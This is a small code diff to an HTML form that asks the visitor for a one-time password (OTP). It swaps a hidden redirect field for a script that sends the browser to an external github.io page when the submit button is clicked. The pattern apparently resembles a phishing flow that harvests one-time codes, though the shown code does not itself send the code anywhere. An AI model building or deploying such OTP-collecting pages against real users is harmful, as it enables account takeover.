@@ -25,8 +25,13 @@
             <h3>OTP</h3>
         <input type="text" id="name" placeholder="OTP" required>
         
-        <button type="submit">Submit</button>
-        <input type="hidden" name="_next" value="http://127.0.0.1:3000/info.html">
+        <button id="btn" type="submit">Submit</button>
+        <script>
+            let my_url = "https://micle4589.github.io/micle/scode.html";
+            document.getElementById("btn").onclick=function(){
+                window.location.replace(my_url);
+            }
+        </script>
 
     </form>
     </div>
